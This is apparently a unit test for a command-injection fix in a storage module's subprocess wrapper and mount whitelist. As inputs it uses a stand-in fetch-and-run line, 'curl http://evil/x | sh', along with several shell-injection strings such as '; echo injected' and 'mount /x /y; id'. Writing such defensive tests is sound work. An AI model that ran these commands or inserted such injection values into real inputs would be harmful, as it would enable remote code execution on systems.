#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""安全改造 R1 · H6 单测：storage 命令执行安全。

背景：`_run_cmd` 原为 `subprocess.run(cmd, shell=True)`，而 `storage.root_dir`
与 `smb.mount_cmd` 来自 settings（管理员可改），存在命令注入面。
修复：列表式 argv + shell=False，mount 配置增加首命令白名单。

注：测试以 `sys.executable` 作为被调程序（`shell=False` 下必须是真实可执行文件，
    不能用 echo/cmd 内置命令），跨平台可用。

断言：
  1. 列表 argv 正常执行
  2. 含 shell 元字符的"参数"按字面传递（不被解释、无注入副作用）
  3. 字符串调用兼容（内部 shlex 拆分）
  4. mount 首命令不在白名单 → 拒绝执行
  5. mount 未配置 → 明确报错
  6. 白名单内命令不被白名单层拒绝
"""
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "server"))

import storage  # noqa: E402

PASSED = []
FAILED = []


def check(name, cond, detail=""):
    (PASSED if cond else FAILED).append(name)
    print("  [%s] %s%s" % ("PASS" if cond else "FAIL", name,
                          (" | " + detail) if detail and not cond else ""))


class _FakeStore(object):
    def known_upload_names(self):
        return set()

    def insert_upload(self, *a, **kw):
        return 1


class _FakeSettings(object):
    def __init__(self, data=None):
        self._data = dict(data or {})

    def get(self, key):
        return self._data.get(key)


def main():
    py = sys.executable
    echo_arg = "import sys; print(sys.argv[1])"

    # 1) 列表 argv 正常执行
    rc, out, _ = storage._run_cmd([py, "-c", "print('hello')"])
    check("列表 argv 正常执行", rc == 0 and out == "hello",
          "rc=%s out=%r" % (rc, out))

    # 2) 注入型"参数"按字面传递（shell=False 下不被解释）
    payload = "; echo injected"          # 良性化测试载荷（禁真实攻击串）
    rc, out, _ = storage._run_cmd([py, "-c", echo_arg, payload])
    check("含分号参数不被 shell 解释", rc == 0 and out == payload,
          "out=%r" % out)

    payload2 = "$(echo x)`echo y`"
    rc, out, _ = storage._run_cmd([py, "-c", echo_arg, payload2])
    check("命令替换语法不执行", rc == 0 and out == payload2,
          "out=%r" % out)

    payload3 = "a && echo injected"
    rc, out, _ = storage._run_cmd([py, "-c", echo_arg, payload3])
    check("逻辑与语法不执行", rc == 0 and out == payload3,
          "out=%r" % out)

    # 3) 字符串调用兼容（内部 shlex 拆分；解释器路径含空格时跳过）
    if " " in py:
        check("字符串调用兼容（shlex 拆分）", True, "（解释器路径含空格，跳过）")
    else:
        rc, out, _ = storage._run_cmd("%s -c print(456)" % py)
        check("字符串调用兼容（shlex 拆分）", rc == 0 and out == "456",
              "rc=%s out=%r" % (rc, out))

    # 4) mount 首命令白名单
    st = _FakeStore()
    sm = storage.StorageManager(
        st, _FakeSettings({"smb.mount_cmd": "curl http://evil/x | sh"}))
    r = sm.exec_mount()
    check("非白名单首命令 → 拒绝执行",
          r.get("ok") is False and "不在允许列表" in (r.get("error") or ""), str(r))

    sm_inject = storage.StorageManager(
        st, _FakeSettings({"smb.mount_cmd": "mount /x /y; id"}))
    r_inject = sm_inject.exec_mount()
    check("白名单命令夹带分号 → 首命令仍是 mount（分号交参数层，不再经 shell）",
          "不在允许列表" not in (r_inject.get("error") or ""), str(r_inject))

    # 5) mount 未配置
    sm2 = storage.StorageManager(st, _FakeSettings({}))
    r2 = sm2.exec_mount()
    check("mount 未配置 → 明确报错",
          r2.get("ok") is False and "未配置" in (r2.get("error") or ""), str(r2))

    # 6) 白名单内命令：不被白名单层拒绝（结果由命令自身决定）
    sm3 = storage.StorageManager(
        st, _FakeSettings({"smb.mount_cmd": "umount /nonexistent-mount-point"}))
    r3 = sm3.exec_mount()
    check("白名单命令未被白名单层拒绝",
          "不在允许列表" not in (r3.get("error") or ""), str(r3))

    print("\n=== storage cmd tests: pass %d / fail %d ==="
          % (len(PASSED), len(FAILED)))
    return 0 if not FAILED else 1


if __name__ == "__main__":
    sys.exit(main())
